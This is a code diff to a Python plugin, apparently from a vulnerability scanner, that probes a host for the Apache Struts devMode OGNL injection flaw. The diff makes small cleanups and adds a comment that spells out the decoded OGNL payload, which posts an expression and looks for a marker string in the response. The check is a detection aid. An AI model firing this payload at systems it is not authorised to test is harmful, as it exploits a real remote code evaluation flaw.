@@ -8,6 +8,7 @@ class P(T):
     def __init__(self):
         T.__init__(self)
         keywords=['struts']
+
     def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
         target_url = ''
         target_url = 'http://' + ip + ':' + port
@@ -26,9 +27,9 @@ class P(T):
         timeout=3
         result['result']=False
         res=None
+        # debug=browser&object=(#mem=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?#context[#parameters.rpsobj[0]].getWriter().println(#parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789
         payload = "debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789"
 
-        print target_url
         try:
             headers = {"Content-Type":"application/x-www-form-urlencoded"}
             r = requests.post(target_url,data=payload,headers=headers,timeout=5)
@@ -43,7 +44,7 @@ class P(T):
                 del res
 
         if res_html.find("123456789") <> -1:
-	    cprint(target_url + '存在structsdevmode漏洞', 'red')
+            cprint(target_url + '存在structsdevmode漏洞', 'red')
             info = target_url + "strutsdevmode  Vul"
             result['result']=True
             result['VerifyInfo'] = {}
